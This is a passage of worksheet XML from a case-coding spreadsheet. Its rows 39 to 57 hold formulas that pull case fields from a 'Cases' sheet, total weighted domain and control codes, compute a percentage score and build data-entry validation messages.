      <c r="C39" s="11">
        <f>Cases!C39</f>
        <v/>
      </c>
      <c r="D39" s="11">
        <f>IF(Cases!F39="",LEFT(Cases!G39,120),Cases!F39)</f>
        <v/>
      </c>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c r="AI39" s="13">
        <f>IF(COUNT(E39:L39)=0,"",SUM(E39:L39))</f>
        <v/>
      </c>
      <c r="AJ39" s="13">
        <f>IF(AI39="","",N(E39)*3+N(F39)*2+N(G39)*2+N(H39)*2+N(I39)*2+N(J39)*3+N(K39)*3+N(L39)*3)</f>
        <v/>
      </c>
      <c r="AK39" s="13">
        <f>IF(AI39="","",COUNTIF(N39:AG39,1))</f>
        <v/>
      </c>
      <c r="AL39" s="13">
        <f>IF(OR(AJ39="",AJ39=0),"",ROUND(100*(AJ39-AK39)/AJ39,1))</f>
        <v/>
      </c>
      <c r="AM39" s="11">
        <f>IF(AI39="","",IF(AI39=0,"No domain coded 1; ","")&amp;IF(M39="","Primary domain missing; ",IF(IFERROR(INDEX(E39:L39,1,M39),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N39:AG39)&lt;&gt;AJ39,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH39="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN39" s="13">
        <f>IF(AND(AI39&lt;&gt;"",AM39=""),1,0)</f>
        <v/>
      </c>
      <c r="AO39" s="14" t="n"/>
    </row>
    <row r="40">
      <c r="A40" s="11">
        <f>Cases!A40</f>
        <v/>
      </c>
      <c r="B40" s="11">
        <f>Cases!B40</f>
        <v/>
      </c>
      <c r="C40" s="11">
        <f>Cases!C40</f>
        <v/>
      </c>
      <c r="D40" s="11">
        <f>IF(Cases!F40="",LEFT(Cases!G40,120),Cases!F40)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E40:L40)=0,"",SUM(E40:L40))</f>
        <v/>
      </c>
      <c r="AJ40" s="13">
        <f>IF(AI40="","",N(E40)*3+N(F40)*2+N(G40)*2+N(H40)*2+N(I40)*2+N(J40)*3+N(K40)*3+N(L40)*3)</f>
        <v/>
      </c>
      <c r="AK40" s="13">
        <f>IF(AI40="","",COUNTIF(N40:AG40,1))</f>
        <v/>
      </c>
      <c r="AL40" s="13">
        <f>IF(OR(AJ40="",AJ40=0),"",ROUND(100*(AJ40-AK40)/AJ40,1))</f>
        <v/>
      </c>
      <c r="AM40" s="11">
        <f>IF(AI40="","",IF(AI40=0,"No domain coded 1; ","")&amp;IF(M40="","Primary domain missing; ",IF(IFERROR(INDEX(E40:L40,1,M40),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N40:AG40)&lt;&gt;AJ40,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH40="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN40" s="13">
        <f>IF(AND(AI40&lt;&gt;"",AM40=""),1,0)</f>
        <v/>
      </c>
      <c r="AO40" s="14" t="n"/>
    </row>
    <row r="41">
      <c r="A41" s="11">
        <f>Cases!A41</f>
        <v/>
      </c>
      <c r="B41" s="11">
        <f>Cases!B41</f>
        <v/>
      </c>
      <c r="C41" s="11">
        <f>Cases!C41</f>
        <v/>
      </c>
      <c r="D41" s="11">
        <f>IF(Cases!F41="",LEFT(Cases!G41,120),Cases!F41)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E41:L41)=0,"",SUM(E41:L41))</f>
        <v/>
      </c>
      <c r="AJ41" s="13">
        <f>IF(AI41="","",N(E41)*3+N(F41)*2+N(G41)*2+N(H41)*2+N(I41)*2+N(J41)*3+N(K41)*3+N(L41)*3)</f>
        <v/>
      </c>
      <c r="AK41" s="13">
        <f>IF(AI41="","",COUNTIF(N41:AG41,1))</f>
        <v/>
      </c>
      <c r="AL41" s="13">
        <f>IF(OR(AJ41="",AJ41=0),"",ROUND(100*(AJ41-AK41)/AJ41,1))</f>
        <v/>
      </c>
      <c r="AM41" s="11">
        <f>IF(AI41="","",IF(AI41=0,"No domain coded 1; ","")&amp;IF(M41="","Primary domain missing; ",IF(IFERROR(INDEX(E41:L41,1,M41),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N41:AG41)&lt;&gt;AJ41,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH41="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN41" s="13">
        <f>IF(AND(AI41&lt;&gt;"",AM41=""),1,0)</f>
        <v/>
      </c>
      <c r="AO41" s="14" t="n"/>
    </row>
    <row r="42">
      <c r="A42" s="11">
        <f>Cases!A42</f>
        <v/>
      </c>
      <c r="B42" s="11">
        <f>Cases!B42</f>
        <v/>
      </c>
      <c r="C42" s="11">
        <f>Cases!C42</f>
        <v/>
      </c>
      <c r="D42" s="11">
        <f>IF(Cases!F42="",LEFT(Cases!G42,120),Cases!F42)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E42:L42)=0,"",SUM(E42:L42))</f>
        <v/>
      </c>
      <c r="AJ42" s="13">
        <f>IF(AI42="","",N(E42)*3+N(F42)*2+N(G42)*2+N(H42)*2+N(I42)*2+N(J42)*3+N(K42)*3+N(L42)*3)</f>
        <v/>
      </c>
      <c r="AK42" s="13">
        <f>IF(AI42="","",COUNTIF(N42:AG42,1))</f>
        <v/>
      </c>
      <c r="AL42" s="13">
        <f>IF(OR(AJ42="",AJ42=0),"",ROUND(100*(AJ42-AK42)/AJ42,1))</f>
        <v/>
      </c>
      <c r="AM42" s="11">
        <f>IF(AI42="","",IF(AI42=0,"No domain coded 1; ","")&amp;IF(M42="","Primary domain missing; ",IF(IFERROR(INDEX(E42:L42,1,M42),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N42:AG42)&lt;&gt;AJ42,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH42="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN42" s="13">
        <f>IF(AND(AI42&lt;&gt;"",AM42=""),1,0)</f>
        <v/>
      </c>
      <c r="AO42" s="14" t="n"/>
    </row>
    <row r="43">
      <c r="A43" s="11">
        <f>Cases!A43</f>
        <v/>
      </c>
      <c r="B43" s="11">
        <f>Cases!B43</f>
        <v/>
      </c>
      <c r="C43" s="11">
        <f>Cases!C43</f>
        <v/>
      </c>
      <c r="D43" s="11">
        <f>IF(Cases!F43="",LEFT(Cases!G43,120),Cases!F43)</f>
        <v/>
      </c>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c r="AI43" s="13">
        <f>IF(COUNT(E43:L43)=0,"",SUM(E43:L43))</f>
        <v/>
      </c>
      <c r="AJ43" s="13">
        <f>IF(AI43="","",N(E43)*3+N(F43)*2+N(G43)*2+N(H43)*2+N(I43)*2+N(J43)*3+N(K43)*3+N(L43)*3)</f>
        <v/>
      </c>
      <c r="AK43" s="13">
        <f>IF(AI43="","",COUNTIF(N43:AG43,1))</f>
        <v/>
      </c>
      <c r="AL43" s="13">
        <f>IF(OR(AJ43="",AJ43=0),"",ROUND(100*(AJ43-AK43)/AJ43,1))</f>
        <v/>
      </c>
      <c r="AM43" s="11">
        <f>IF(AI43="","",IF(AI43=0,"No domain coded 1; ","")&amp;IF(M43="","Primary domain missing; ",IF(IFERROR(INDEX(E43:L43,1,M43),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N43:AG43)&lt;&gt;AJ43,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH43="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN43" s="13">
        <f>IF(AND(AI43&lt;&gt;"",AM43=""),1,0)</f>
        <v/>
      </c>
      <c r="AO43" s="14" t="n"/>
    </row>
    <row r="44">
      <c r="A44" s="11">
        <f>Cases!A44</f>
        <v/>
      </c>
      <c r="B44" s="11">
        <f>Cases!B44</f>
        <v/>
      </c>
      <c r="C44" s="11">
        <f>Cases!C44</f>
        <v/>
      </c>
      <c r="D44" s="11">
        <f>IF(Cases!F44="",LEFT(Cases!G44,120),Cases!F44)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E44:L44)=0,"",SUM(E44:L44))</f>
        <v/>
      </c>
      <c r="AJ44" s="13">
        <f>IF(AI44="","",N(E44)*3+N(F44)*2+N(G44)*2+N(H44)*2+N(I44)*2+N(J44)*3+N(K44)*3+N(L44)*3)</f>
        <v/>
      </c>
      <c r="AK44" s="13">
        <f>IF(AI44="","",COUNTIF(N44:AG44,1))</f>
        <v/>
      </c>
      <c r="AL44" s="13">
        <f>IF(OR(AJ44="",AJ44=0),"",ROUND(100*(AJ44-AK44)/AJ44,1))</f>
        <v/>
      </c>
      <c r="AM44" s="11">
        <f>IF(AI44="","",IF(AI44=0,"No domain coded 1; ","")&amp;IF(M44="","Primary domain missing; ",IF(IFERROR(INDEX(E44:L44,1,M44),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N44:AG44)&lt;&gt;AJ44,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH44="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN44" s="13">
        <f>IF(AND(AI44&lt;&gt;"",AM44=""),1,0)</f>
        <v/>
      </c>
      <c r="AO44" s="14" t="n"/>
    </row>
    <row r="45">
      <c r="A45" s="11">
        <f>Cases!A45</f>
        <v/>
      </c>
      <c r="B45" s="11">
        <f>Cases!B45</f>
        <v/>
      </c>
      <c r="C45" s="11">
        <f>Cases!C45</f>
        <v/>
      </c>
      <c r="D45" s="11">
        <f>IF(Cases!F45="",LEFT(Cases!G45,120),Cases!F45)</f>
        <v/>
      </c>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c r="AI45" s="13">
        <f>IF(COUNT(E45:L45)=0,"",SUM(E45:L45))</f>
        <v/>
      </c>
      <c r="AJ45" s="13">
        <f>IF(AI45="","",N(E45)*3+N(F45)*2+N(G45)*2+N(H45)*2+N(I45)*2+N(J45)*3+N(K45)*3+N(L45)*3)</f>
        <v/>
      </c>
      <c r="AK45" s="13">
        <f>IF(AI45="","",COUNTIF(N45:AG45,1))</f>
        <v/>
      </c>
      <c r="AL45" s="13">
        <f>IF(OR(AJ45="",AJ45=0),"",ROUND(100*(AJ45-AK45)/AJ45,1))</f>
        <v/>
      </c>
      <c r="AM45" s="11">
        <f>IF(AI45="","",IF(AI45=0,"No domain coded 1; ","")&amp;IF(M45="","Primary domain missing; ",IF(IFERROR(INDEX(E45:L45,1,M45),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N45:AG45)&lt;&gt;AJ45,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH45="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN45" s="13">
        <f>IF(AND(AI45&lt;&gt;"",AM45=""),1,0)</f>
        <v/>
      </c>
      <c r="AO45" s="14" t="n"/>
    </row>
    <row r="46">
      <c r="A46" s="11">
        <f>Cases!A46</f>
        <v/>
      </c>
      <c r="B46" s="11">
        <f>Cases!B46</f>
        <v/>
      </c>
      <c r="C46" s="11">
        <f>Cases!C46</f>
        <v/>
      </c>
      <c r="D46" s="11">
        <f>IF(Cases!F46="",LEFT(Cases!G46,120),Cases!F46)</f>
        <v/>
      </c>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c r="AI46" s="13">
        <f>IF(COUNT(E46:L46)=0,"",SUM(E46:L46))</f>
        <v/>
      </c>
      <c r="AJ46" s="13">
        <f>IF(AI46="","",N(E46)*3+N(F46)*2+N(G46)*2+N(H46)*2+N(I46)*2+N(J46)*3+N(K46)*3+N(L46)*3)</f>
        <v/>
      </c>
      <c r="AK46" s="13">
        <f>IF(AI46="","",COUNTIF(N46:AG46,1))</f>
        <v/>
      </c>
      <c r="AL46" s="13">
        <f>IF(OR(AJ46="",AJ46=0),"",ROUND(100*(AJ46-AK46)/AJ46,1))</f>
        <v/>
      </c>
      <c r="AM46" s="11">
        <f>IF(AI46="","",IF(AI46=0,"No domain coded 1; ","")&amp;IF(M46="","Primary domain missing; ",IF(IFERROR(INDEX(E46:L46,1,M46),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N46:AG46)&lt;&gt;AJ46,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH46="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN46" s="13">
        <f>IF(AND(AI46&lt;&gt;"",AM46=""),1,0)</f>
        <v/>
      </c>
      <c r="AO46" s="14" t="n"/>
    </row>
    <row r="47">
      <c r="A47" s="11">
        <f>Cases!A47</f>
        <v/>
      </c>
      <c r="B47" s="11">
        <f>Cases!B47</f>
        <v/>
      </c>
      <c r="C47" s="11">
        <f>Cases!C47</f>
        <v/>
      </c>
      <c r="D47" s="11">
        <f>IF(Cases!F47="",LEFT(Cases!G47,120),Cases!F47)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E47:L47)=0,"",SUM(E47:L47))</f>
        <v/>
      </c>
      <c r="AJ47" s="13">
        <f>IF(AI47="","",N(E47)*3+N(F47)*2+N(G47)*2+N(H47)*2+N(I47)*2+N(J47)*3+N(K47)*3+N(L47)*3)</f>
        <v/>
      </c>
      <c r="AK47" s="13">
        <f>IF(AI47="","",COUNTIF(N47:AG47,1))</f>
        <v/>
      </c>
      <c r="AL47" s="13">
        <f>IF(OR(AJ47="",AJ47=0),"",ROUND(100*(AJ47-AK47)/AJ47,1))</f>
        <v/>
      </c>
      <c r="AM47" s="11">
        <f>IF(AI47="","",IF(AI47=0,"No domain coded 1; ","")&amp;IF(M47="","Primary domain missing; ",IF(IFERROR(INDEX(E47:L47,1,M47),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N47:AG47)&lt;&gt;AJ47,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH47="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN47" s="13">
        <f>IF(AND(AI47&lt;&gt;"",AM47=""),1,0)</f>
        <v/>
      </c>
      <c r="AO47" s="14" t="n"/>
    </row>
    <row r="48">
      <c r="A48" s="11">
        <f>Cases!A48</f>
        <v/>
      </c>
      <c r="B48" s="11">
        <f>Cases!B48</f>
        <v/>
      </c>
      <c r="C48" s="11">
        <f>Cases!C48</f>
        <v/>
      </c>
      <c r="D48" s="11">
        <f>IF(Cases!F48="",LEFT(Cases!G48,120),Cases!F48)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E48:L48)=0,"",SUM(E48:L48))</f>
        <v/>
      </c>
      <c r="AJ48" s="13">
        <f>IF(AI48="","",N(E48)*3+N(F48)*2+N(G48)*2+N(H48)*2+N(I48)*2+N(J48)*3+N(K48)*3+N(L48)*3)</f>
        <v/>
      </c>
      <c r="AK48" s="13">
        <f>IF(AI48="","",COUNTIF(N48:AG48,1))</f>
        <v/>
      </c>
      <c r="AL48" s="13">
        <f>IF(OR(AJ48="",AJ48=0),"",ROUND(100*(AJ48-AK48)/AJ48,1))</f>
        <v/>
      </c>
      <c r="AM48" s="11">
        <f>IF(AI48="","",IF(AI48=0,"No domain coded 1; ","")&amp;IF(M48="","Primary domain missing; ",IF(IFERROR(INDEX(E48:L48,1,M48),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N48:AG48)&lt;&gt;AJ48,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH48="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN48" s="13">
        <f>IF(AND(AI48&lt;&gt;"",AM48=""),1,0)</f>
        <v/>
      </c>
      <c r="AO48" s="14" t="n"/>
    </row>
    <row r="49">
      <c r="A49" s="11">
        <f>Cases!A49</f>
        <v/>
      </c>
      <c r="B49" s="11">
        <f>Cases!B49</f>
        <v/>
      </c>
      <c r="C49" s="11">
        <f>Cases!C49</f>
        <v/>
      </c>
      <c r="D49" s="11">
        <f>IF(Cases!F49="",LEFT(Cases!G49,120),Cases!F49)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E49:L49)=0,"",SUM(E49:L49))</f>
        <v/>
      </c>
      <c r="AJ49" s="13">
        <f>IF(AI49="","",N(E49)*3+N(F49)*2+N(G49)*2+N(H49)*2+N(I49)*2+N(J49)*3+N(K49)*3+N(L49)*3)</f>
        <v/>
      </c>
      <c r="AK49" s="13">
        <f>IF(AI49="","",COUNTIF(N49:AG49,1))</f>
        <v/>
      </c>
      <c r="AL49" s="13">
        <f>IF(OR(AJ49="",AJ49=0),"",ROUND(100*(AJ49-AK49)/AJ49,1))</f>
        <v/>
      </c>
      <c r="AM49" s="11">
        <f>IF(AI49="","",IF(AI49=0,"No domain coded 1; ","")&amp;IF(M49="","Primary domain missing; ",IF(IFERROR(INDEX(E49:L49,1,M49),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N49:AG49)&lt;&gt;AJ49,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH49="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN49" s="13">
        <f>IF(AND(AI49&lt;&gt;"",AM49=""),1,0)</f>
        <v/>
      </c>
      <c r="AO49" s="14" t="n"/>
    </row>
    <row r="50">
      <c r="A50" s="11">
        <f>Cases!A50</f>
        <v/>
      </c>
      <c r="B50" s="11">
        <f>Cases!B50</f>
        <v/>
      </c>
      <c r="C50" s="11">
        <f>Cases!C50</f>
        <v/>
      </c>
      <c r="D50" s="11">
        <f>IF(Cases!F50="",LEFT(Cases!G50,120),Cases!F50)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E50:L50)=0,"",SUM(E50:L50))</f>
        <v/>
      </c>
      <c r="AJ50" s="13">
        <f>IF(AI50="","",N(E50)*3+N(F50)*2+N(G50)*2+N(H50)*2+N(I50)*2+N(J50)*3+N(K50)*3+N(L50)*3)</f>
        <v/>
      </c>
      <c r="AK50" s="13">
        <f>IF(AI50="","",COUNTIF(N50:AG50,1))</f>
        <v/>
      </c>
      <c r="AL50" s="13">
        <f>IF(OR(AJ50="",AJ50=0),"",ROUND(100*(AJ50-AK50)/AJ50,1))</f>
        <v/>
      </c>
      <c r="AM50" s="11">
        <f>IF(AI50="","",IF(AI50=0,"No domain coded 1; ","")&amp;IF(M50="","Primary domain missing; ",IF(IFERROR(INDEX(E50:L50,1,M50),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N50:AG50)&lt;&gt;AJ50,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH50="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN50" s="13">
        <f>IF(AND(AI50&lt;&gt;"",AM50=""),1,0)</f>
        <v/>
      </c>
      <c r="AO50" s="14" t="n"/>
    </row>
    <row r="51">
      <c r="A51" s="11">
        <f>Cases!A51</f>
        <v/>
      </c>
      <c r="B51" s="11">
        <f>Cases!B51</f>
        <v/>
      </c>
      <c r="C51" s="11">
        <f>Cases!C51</f>
        <v/>
      </c>
      <c r="D51" s="11">
        <f>IF(Cases!F51="",LEFT(Cases!G51,120),Cases!F51)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E51:L51)=0,"",SUM(E51:L51))</f>
        <v/>
      </c>
      <c r="AJ51" s="13">
        <f>IF(AI51="","",N(E51)*3+N(F51)*2+N(G51)*2+N(H51)*2+N(I51)*2+N(J51)*3+N(K51)*3+N(L51)*3)</f>
        <v/>
      </c>
      <c r="AK51" s="13">
        <f>IF(AI51="","",COUNTIF(N51:AG51,1))</f>
        <v/>
      </c>
      <c r="AL51" s="13">
        <f>IF(OR(AJ51="",AJ51=0),"",ROUND(100*(AJ51-AK51)/AJ51,1))</f>
        <v/>
      </c>
      <c r="AM51" s="11">
        <f>IF(AI51="","",IF(AI51=0,"No domain coded 1; ","")&amp;IF(M51="","Primary domain missing; ",IF(IFERROR(INDEX(E51:L51,1,M51),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N51:AG51)&lt;&gt;AJ51,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH51="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN51" s="13">
        <f>IF(AND(AI51&lt;&gt;"",AM51=""),1,0)</f>
        <v/>
      </c>
      <c r="AO51" s="14" t="n"/>
    </row>
    <row r="52">
      <c r="A52" s="11">
        <f>Cases!A52</f>
        <v/>
      </c>
      <c r="B52" s="11">
        <f>Cases!B52</f>
        <v/>
      </c>
      <c r="C52" s="11">
        <f>Cases!C52</f>
        <v/>
      </c>
      <c r="D52" s="11">
        <f>IF(Cases!F52="",LEFT(Cases!G52,120),Cases!F52)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E52:L52)=0,"",SUM(E52:L52))</f>
        <v/>
      </c>
      <c r="AJ52" s="13">
        <f>IF(AI52="","",N(E52)*3+N(F52)*2+N(G52)*2+N(H52)*2+N(I52)*2+N(J52)*3+N(K52)*3+N(L52)*3)</f>
        <v/>
      </c>
      <c r="AK52" s="13">
        <f>IF(AI52="","",COUNTIF(N52:AG52,1))</f>
        <v/>
      </c>
      <c r="AL52" s="13">
        <f>IF(OR(AJ52="",AJ52=0),"",ROUND(100*(AJ52-AK52)/AJ52,1))</f>
        <v/>
      </c>
      <c r="AM52" s="11">
        <f>IF(AI52="","",IF(AI52=0,"No domain coded 1; ","")&amp;IF(M52="","Primary domain missing; ",IF(IFERROR(INDEX(E52:L52,1,M52),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N52:AG52)&lt;&gt;AJ52,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH52="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN52" s="13">
        <f>IF(AND(AI52&lt;&gt;"",AM52=""),1,0)</f>
        <v/>
      </c>
      <c r="AO52" s="14" t="n"/>
    </row>
    <row r="53">
      <c r="A53" s="11">
        <f>Cases!A53</f>
        <v/>
      </c>
      <c r="B53" s="11">
        <f>Cases!B53</f>
        <v/>
      </c>
      <c r="C53" s="11">
        <f>Cases!C53</f>
        <v/>
      </c>
      <c r="D53" s="11">
        <f>IF(Cases!F53="",LEFT(Cases!G53,120),Cases!F53)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E53:L53)=0,"",SUM(E53:L53))</f>
        <v/>
      </c>
      <c r="AJ53" s="13">
        <f>IF(AI53="","",N(E53)*3+N(F53)*2+N(G53)*2+N(H53)*2+N(I53)*2+N(J53)*3+N(K53)*3+N(L53)*3)</f>
        <v/>
      </c>
      <c r="AK53" s="13">
        <f>IF(AI53="","",COUNTIF(N53:AG53,1))</f>
        <v/>
      </c>
      <c r="AL53" s="13">
        <f>IF(OR(AJ53="",AJ53=0),"",ROUND(100*(AJ53-AK53)/AJ53,1))</f>
        <v/>
      </c>
      <c r="AM53" s="11">
        <f>IF(AI53="","",IF(AI53=0,"No domain coded 1; ","")&amp;IF(M53="","Primary domain missing; ",IF(IFERROR(INDEX(E53:L53,1,M53),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N53:AG53)&lt;&gt;AJ53,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH53="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN53" s="13">
        <f>IF(AND(AI53&lt;&gt;"",AM53=""),1,0)</f>
        <v/>
      </c>
      <c r="AO53" s="14" t="n"/>
    </row>
    <row r="54">
      <c r="A54" s="11">
        <f>Cases!A54</f>
        <v/>
      </c>
      <c r="B54" s="11">
        <f>Cases!B54</f>
        <v/>
      </c>
      <c r="C54" s="11">
        <f>Cases!C54</f>
        <v/>
      </c>
      <c r="D54" s="11">
        <f>IF(Cases!F54="",LEFT(Cases!G54,120),Cases!F54)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E54:L54)=0,"",SUM(E54:L54))</f>
        <v/>
      </c>
      <c r="AJ54" s="13">
        <f>IF(AI54="","",N(E54)*3+N(F54)*2+N(G54)*2+N(H54)*2+N(I54)*2+N(J54)*3+N(K54)*3+N(L54)*3)</f>
        <v/>
      </c>
      <c r="AK54" s="13">
        <f>IF(AI54="","",COUNTIF(N54:AG54,1))</f>
        <v/>
      </c>
      <c r="AL54" s="13">
        <f>IF(OR(AJ54="",AJ54=0),"",ROUND(100*(AJ54-AK54)/AJ54,1))</f>
        <v/>
      </c>
      <c r="AM54" s="11">
        <f>IF(AI54="","",IF(AI54=0,"No domain coded 1; ","")&amp;IF(M54="","Primary domain missing; ",IF(IFERROR(INDEX(E54:L54,1,M54),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N54:AG54)&lt;&gt;AJ54,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH54="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN54" s="13">
        <f>IF(AND(AI54&lt;&gt;"",AM54=""),1,0)</f>
        <v/>
      </c>
      <c r="AO54" s="14" t="n"/>
    </row>
    <row r="55">
      <c r="A55" s="11">
        <f>Cases!A55</f>
        <v/>
      </c>
      <c r="B55" s="11">
        <f>Cases!B55</f>
        <v/>
      </c>
      <c r="C55" s="11">
        <f>Cases!C55</f>
        <v/>
      </c>
      <c r="D55" s="11">
        <f>IF(Cases!F55="",LEFT(Cases!G55,120),Cases!F55)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E55:L55)=0,"",SUM(E55:L55))</f>
        <v/>
      </c>
      <c r="AJ55" s="13">
        <f>IF(AI55="","",N(E55)*3+N(F55)*2+N(G55)*2+N(H55)*2+N(I55)*2+N(J55)*3+N(K55)*3+N(L55)*3)</f>
        <v/>
      </c>
      <c r="AK55" s="13">
        <f>IF(AI55="","",COUNTIF(N55:AG55,1))</f>
        <v/>
      </c>
      <c r="AL55" s="13">
        <f>IF(OR(AJ55="",AJ55=0),"",ROUND(100*(AJ55-AK55)/AJ55,1))</f>
        <v/>
      </c>
      <c r="AM55" s="11">
        <f>IF(AI55="","",IF(AI55=0,"No domain coded 1; ","")&amp;IF(M55="","Primary domain missing; ",IF(IFERROR(INDEX(E55:L55,1,M55),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N55:AG55)&lt;&gt;AJ55,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH55="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN55" s="13">
        <f>IF(AND(AI55&lt;&gt;"",AM55=""),1,0)</f>
        <v/>
      </c>
      <c r="AO55" s="14" t="n"/>
    </row>
    <row r="56">
      <c r="A56" s="11">
        <f>Cases!A56</f>
        <v/>
      </c>
      <c r="B56" s="11">
        <f>Cases!B56</f>
        <v/>
      </c>
      <c r="C56" s="11">
        <f>Cases!C56</f>
        <v/>
      </c>
      <c r="D56" s="11">
        <f>IF(Cases!F56="",LEFT(Cases!G56,120),Cases!F56)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E56:L56)=0,"",SUM(E56:L56))</f>
        <v/>
      </c>
      <c r="AJ56" s="13">
        <f>IF(AI56="","",N(E56)*3+N(F56)*2+N(G56)*2+N(H56)*2+N(I56)*2+N(J56)*3+N(K56)*3+N(L56)*3)</f>
        <v/>
      </c>
      <c r="AK56" s="13">
        <f>IF(AI56="","",COUNTIF(N56:AG56,1))</f>
        <v/>
      </c>
      <c r="AL56" s="13">
        <f>IF(OR(AJ56="",AJ56=0),"",ROUND(100*(AJ56-AK56)/AJ56,1))</f>
        <v/>
      </c>
      <c r="AM56" s="11">
        <f>IF(AI56="","",IF(AI56=0,"No domain coded 1; ","")&amp;IF(M56="","Primary domain missing; ",IF(IFERROR(INDEX(E56:L56,1,M56),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N56:AG56)&lt;&gt;AJ56,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH56="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN56" s="13">
        <f>IF(AND(AI56&lt;&gt;"",AM56=""),1,0)</f>
        <v/>
      </c>
      <c r="AO56" s="14" t="n"/>
    </row>
    <row r="57">
      <c r="A57" s="11">
        <f>Cases!A57</f>
        <v/>
      </c>
      <c r="B57" s="11">
        <f>Cases!B57</f>
        <v/>
      </c>
      <c r="C57" s="11">
        <f>Cases!C57</f>
        <v/>
      </c>
      <c r="D57" s="11">
        <f>IF(Cases!F57="",LEFT(Cases!G57,120),Cases!F57)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E57:L57)=0,"",SUM(E57:L57))</f>
        <v/>
      </c>
      <c r="AJ57" s="13">
        <f>IF(AI57="","",N(E57)*3+N(F57)*2+N(G57)*2+N(H57)*2+N(I57)*2+N(J57)*3+N(K57)*3+N(L57)*3)</f>
        <v/>
      </c>
      <c r="AK57" s="13">
        <f>IF(AI57="","",COUNTIF(N57:AG57,1))</f>
        <v/>
      </c>
      <c r="AL57" s="13">
        <f>IF(OR(AJ57="",AJ57=0),"",ROUND(100*(AJ57-AK57)/AJ57,1))</f>
        <v/>
      </c>
      <c r="AM57" s="11">
        <f>IF(AI57="","",IF(AI57=0,"No domain coded 1; ","")&amp;IF(M57="","Primary domain missing; ",IF(IFERROR(INDEX(E57:L57,1,M57),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N57:AG57)&lt;&gt;AJ57,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH57="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN57" s="13">
